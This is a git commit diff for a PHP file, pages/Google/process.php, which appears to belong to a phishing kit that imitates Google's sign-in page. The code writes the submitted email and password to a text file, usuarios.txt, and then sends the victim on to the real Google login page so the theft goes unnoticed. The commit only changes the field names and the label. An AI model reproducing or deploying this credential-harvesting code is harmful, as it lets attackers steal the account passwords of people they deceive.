3a1ec08faa0f5b0b10b2b7fdab0531042b8e4d51
Euronymou5 <85043356+Euronymou5@users.noreply.github.com>
2022-02-26 02:58:08 -0600

    Update process.php

--- pages/Google/process.php
+++ pages/Google/process.php
@@ -1,6 +1,6 @@
 <?php
 
-file_put_contents("usuarios.txt", "Cuenta: " . $_POST['username'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
+file_put_contents("usuarios.txt", "Cuenta de google: " . $_POST['email'] . " Contraseña: " . $_POST['pass'] . "\n", FILE_APPEND);
 header('Location: https://accounts.google.com/servicelogin');
 exit();
 ?>
